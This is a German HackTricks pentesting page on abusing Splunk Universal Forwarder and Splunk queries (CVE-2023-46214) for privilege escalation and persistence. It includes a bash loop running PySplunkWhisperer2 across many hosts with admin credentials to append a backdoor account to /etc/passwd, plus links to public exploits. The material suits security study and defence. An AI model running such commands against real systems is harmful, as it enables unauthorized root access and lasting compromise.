# Splunk LPE und Persistenz

<details>

<summary><strong>Lernen Sie AWS-Hacking von Null auf Held mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere Möglichkeiten, HackTricks zu unterstützen:

* Wenn Sie Ihr **Unternehmen in HackTricks bewerben möchten** oder **HackTricks als PDF herunterladen möchten**, überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) Github-Repositories senden.

</details>

Wenn Sie eine Maschine **intern** oder **extern** **enumerieren** und **Splunk läuft** (Port 8090), können Sie, wenn Sie **glücklicherweise gültige Anmeldeinformationen kennen**, den Splunk-Dienst missbrauchen, um eine Shell als der Benutzer auszuführen, der Splunk ausführt. Wenn root ausgeführt wird, können Sie die Berechtigungen auf root-Ebene eskalieren.

Wenn Sie bereits root sind und der Splunk-Dienst nicht nur auf localhost lauscht, können Sie die Passwortdatei vom Splunk-Dienst **stehlen** und die Passwörter **knacken** oder neue Anmeldeinformationen hinzufügen. Und die Persistenz auf dem Host aufrechterhalten.

Im ersten Bild unten sehen Sie, wie eine Splunkd-Webseite aussieht.



## Zusammenfassung des Splunk Universal Forwarder Agent Exploits

Für weitere Details lesen Sie den Beitrag [https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/](https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/). Dies ist nur eine Zusammenfassung:

**Exploit-Übersicht:**
Ein Exploit, der auf den Splunk Universal Forwarder Agent (UF) abzielt, ermöglicht es Angreifern mit dem Agent-Passwort, beliebigen Code auf Systemen auszuführen, auf denen der Agent läuft, und potenziell ein gesamtes Netzwerk zu kompromittieren.

**Hauptpunkte:**
- Der UF-Agent überprüft eingehende Verbindungen oder die Authentizität des Codes nicht, wodurch er anfällig für unbefugte Codeausführung ist.
- Gängige Methoden zum Erlangen von Passwörtern umfassen das Auffinden in Netzwerkverzeichnissen, Dateifreigaben oder internen Dokumentationen.
- Eine erfolgreiche Ausnutzung kann zu SYSTEM- oder Root-Zugriff auf kompromittierte Hosts, Datenexfiltration und weiterer Netzwerkinfiltration führen.

**Exploit-Ausführung:**
1. Angreifer erhält das UF-Agent-Passwort.
2. Nutzt die Splunk-API, um Befehle oder Skripte an die Agenten zu senden.
3. Mögliche Aktionen umfassen Dateiextraktion, Manipulation von Benutzerkonten und Systemkompromittierung.

**Auswirkungen:**
- Vollständige Netzwerkkompromittierung mit SYSTEM-/Root-Zugriffsberechtigungen auf jedem Host.
- Möglichkeit zur Deaktivierung der Protokollierung zur Vermeidung der Erkennung.
- Installation von Hintertüren oder Erpressungssoftware.

**Beispielbefehl zur Ausnutzung:**
```bash
for i in `cat ip.txt`; do python PySplunkWhisperer2_remote.py --host $i --port 8089 --username admin --password "12345678" --payload "echo 'attacker007:x:1003:1003::/home/:/bin/bash' >> /etc/passwd" --lhost 192.168.42.51;done
```
**Verwendbare öffentliche Exploits:**
* https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2
* https://www.exploit-db.com/exploits/46238
* https://www.exploit-db.com/exploits/46487


## Missbrauch von Splunk-Abfragen

**Weitere Details finden Sie im Beitrag [https://blog.hrncirik.net/cve-2023-46214-analysis](https://blog.hrncirik.net/cve-2023-46214-analysis)**

Der **CVE-2023-46214** ermöglichte das Hochladen eines beliebigen Skripts nach **`$SPLUNK_HOME/bin/scripts`** und erklärte dann, dass es mit der Suchabfrage **`|runshellscript script_name.sh`** möglich war, das in diesem Verzeichnis gespeicherte **Skript** auszuführen.


<details>

<summary><strong>Lernen Sie AWS-Hacking von Null auf Held mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere Möglichkeiten, HackTricks zu unterstützen:

* Wenn Sie Ihr **Unternehmen in HackTricks bewerben möchten** oder **HackTricks als PDF herunterladen möchten**, überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories senden.

</details>
